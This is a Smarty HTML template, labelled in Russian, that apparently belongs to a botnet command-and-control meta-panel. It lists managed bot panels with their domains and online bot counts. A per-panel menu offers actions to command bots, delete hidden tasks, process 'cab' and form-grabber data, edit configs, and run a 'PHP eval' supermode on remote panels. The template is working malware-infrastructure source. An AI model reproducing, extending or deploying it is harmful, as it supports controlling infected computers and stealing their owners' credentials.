<div class="top_menu">

<div class="top_menu_left">

<a href="#" onclick="return get_window('/admins/auto_tasks.html?window=1', {ldelim}name:'add', widht:'600'{rdelim});">Авто задания</a>&nbsp;{if $pid_checks ne true}<a href="/admins/index.html?x=check">Проверь все админки</a>&nbsp;{/if}

<a href="/admins/builds.html">Билды админок</a>&nbsp;

</div>

<div class="top_menu_right">

<a href="/admins/add.html" onclick="return get_window('/admins/add.html?window=1', {ldelim}name:'add', widht:'600'{rdelim});">Добавить админку</a>&nbsp;

</div>

</div>

{if $admins|@count gt 0}
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
<hr />
<form action="#" name="admins">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bg4" style="border: 1px solid #FFFFFF">
	<th>Клиент</th>
    <th>Домен</th>
    <th style="width:150px;">Ботов (Онлайн)</th>
    <th style="width:150px;">Дата обновления</th>
	<th style="width:200px">Управление</th>
</tr>
{foreach from=$admins item=adm name=admins}
{if $smarty.foreach.admins.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
{if datediff($adm->update_date) > 24}{assign var=bg value=5}{/if}
<tr class="bgp{$bg}" onmousemove="this.className = 'bgp4'" onmouseout="this.className = 'bgp{$bg}'" style="border: 1px solid #FFFFFF; font-size:11px;">
	<th>{$adm->name}</th>
    <th>{$adm->link}</th>
	<th>{$adm->count_bots} ({$adm->live_bots})</th>
    <th>{$adm->update_date}</th>
	<th>
    <select name="control_{$adm->id}" style="font-size: 11px; width:150px">
    <option value="cmd_info_country">1. Посмотреть информацию о ботах по странам</option>
    <option value="cmd_info_prefix">2. Посмотреть информацию о ботах по префиксам</option>
    <option value="cmd_info_uid">3. Посмотреть информацию о боте по UID</option>
    <option value="cmd_create_cmd">4. Дать комманду ботам</option>
    <option value="cmd_stats_cmd">5. Посмотреть информацию о коммандах</option>
    <option value="cmd_deldev_cmd">6. Удалить все скрытые задания</option>
    <option value="cmd_create_link">7. Добавить ссылку</option>
    <option value="cmd_list_links">8. Список ссылок</option>
    <option value="cmd_shever">9. Шейвер кабов</option>
    <option value="cmd_shever_fgr">10. Шейвер формграбера</option>
    <option value="cmd_configs">11. Конфиги</option>
    <option value="cmd_work_adm">12. Выключить/Включить админку</option>
    <option value="cmd_list_users">13. Список пользователей</option>
    <option value="cmd_phpeval">14. PHP eval - cmd supermode</option>
    <option value="cmd_import">15. Настройки импорта</option>
    <option value="cmd_edit">16. Изменить домен</option>
    <option value="cmd_delete">17. Удалить из системы</option>
    </select>
    <input type="button" value="ОК" onclick="put_system_cmd({$adm->id}, document.forms['admins'].elements['control_{$adm->id}'].value);" style="font-size:10px;" />
    </th>
</tr>
{/foreach}
</table>
</form>
<hr />
<div style="font-size:10px" align="center"><br />&nbsp;{$pages}&nbsp;<br /><br /></div>
{else}
<hr />
<div style="text-align:center; font-size:14px; font-weight:bold">Админок не найдено!</div>
<hr />
{/if}